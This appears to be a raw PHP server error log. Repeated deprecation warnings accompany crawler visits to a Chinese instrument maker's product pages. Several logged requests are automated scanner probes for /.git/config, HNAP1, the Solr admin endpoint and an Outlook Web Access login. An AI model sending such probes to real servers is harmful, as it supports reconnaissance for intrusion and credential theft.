[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T15:51:58+08:00 ] 104.248.22.78 GET 120.24.147.77/odinhttpcall1773820318
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T15:51:58+08:00 ] 104.248.22.78 GET 120.24.147.77/odinhttpcall1773820318
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T15:51:59+08:00 ] 104.248.22.78 GET 120.24.147.77/HNAP1
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T15:51:59+08:00 ] 104.248.22.78 GET 120.24.147.77/HNAP1
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T15:51:59+08:00 ] 104.248.22.78 GET 120.24.147.77/evox/about
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T15:51:59+08:00 ] 104.248.22.78 GET 120.24.147.77/evox/about
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T15:51:59+08:00 ] 104.248.22.78 POST 120.24.147.77/sdk
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T15:51:59+08:00 ] 104.248.22.78 GET 120.24.147.77/sdk
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T15:52:01+08:00 ] 104.248.22.78 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T15:54:27+08:00 ] 52.167.144.201 GET www.punalei.cn/ldcms/2jidanxianggonglvjiPNL300xilie.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T15:56:39+08:00 ] 159.65.114.238 GET 120.24.147.77/solr/admin/info/system
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T15:56:39+08:00 ] 159.65.114.238 GET 120.24.147.77/solr/admin/info/system
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T16:10:52+08:00 ] 52.167.144.192 GET www.punalei.cn/ldcms/zhiliudianyuanchanpin.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T16:23:10+08:00 ] 178.128.214.41 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T16:31:33+08:00 ] 172.94.9.253 GET 120.24.147.77/.git/config
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T17:05:56+08:00 ] 206.168.34.54 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T17:06:13+08:00 ] 206.168.34.54 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T17:06:13+08:00 ] 206.168.34.54 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T17:06:55+08:00 ] 206.168.34.54 GET 120.24.147.77/security.txt
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T17:06:55+08:00 ] 206.168.34.54 GET 120.24.147.77/security.txt
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T17:20:05+08:00 ] 40.77.167.47 GET www.punalei.cn/ldcms/anguiceshiyiqixilie.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T17:21:11+08:00 ] 188.166.241.2 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T17:22:12+08:00 ] 185.231.33.46 GET 120.24.147.77/owa/auth/logon.aspx?replaceCurrent=1&url=https%3A%2F%2F120.24.147.77%2Fowa%2F
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T17:22:12+08:00 ] 185.231.33.46 GET 120.24.147.77/owa/auth/logon.aspx?replaceCurrent=1&url=https%3A%2F%2F120.24.147.77%2Fowa%2F
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T17:23:49+08:00 ] 185.231.33.46 GET 120.24.147.77/owa/auth/logon.aspx?replaceCurrent=1&url=https%3A%2F%2F120.24.147.77%2Fowa%2F
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T17:23:49+08:00 ] 185.231.33.46 GET 120.24.147.77/owa/auth/logon.aspx?replaceCurrent=1&url=https%3A%2F%2F120.24.147.77%2Fowa%2F
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T17:29:00+08:00 ] 45.156.128.15 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T17:32:39+08:00 ] 52.167.144.24 GET www.punalei.cn/ldcms/zhiliudianyuanshumaxilie/300.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T17:33:13+08:00 ] 172.105.128.12 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T17:55:36+08:00 ] 149.86.227.60 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T18:03:16+08:00 ] 139.59.116.9 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T18:22:53+08:00 ] 146.190.134.221 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T18:24:34+08:00 ] 40.77.167.7 GET www.punalei.cn/ldcms/jueyuandianzuceshiyi/319.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T18:30:15+08:00 ] 40.77.167.51 GET www.punalei.cn/ldcms/gaosutongdaocaijiwenduceshiyiPNL2000PLUSxilie/271.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T18:31:50+08:00 ] 59.82.83.52 GET 120.24.147.77/dns-query?dns=Z1kBAAABAAAAAAAAA3d3dwRiaW5nA2NvbQAAAQAB
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T18:31:50+08:00 ] 59.82.83.52 GET 120.24.147.77/dns-query?dns=Z1kBAAABAAAAAAAAA3d3dwRiaW5nA2NvbQAAAQAB
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
---------------------------------------------------------------
[ 2026-03-18T18:38:18+08:00 ] 52.167.144.209 GET www.punalei.cn/ldcms/punaleiPNAIduogongnenganguixilie/308.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T18:41:45+08:00 ] 134.209.235.25 GET 120.24.147.77/
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
[ error ] [2]Undefined array key "title"
---------------------------------------------------------------
[ 2026-03-18T18:47:03+08:00 ] 52.167.144.229 GET www.punalei.cn/ldcms/jiaoliubianpindianyuan/314.html
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]Automatic conversion of false to array is deprecated
---------------------------------------------------------------
[ 2026-03-18T18:48:12+08:00 ] 167.94.138.196 GET 120.24.147.77/favicon.ico
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
[ error ] [8192]preg_match(): Passing null to parameter #2 ($subject) of type string is deprecated
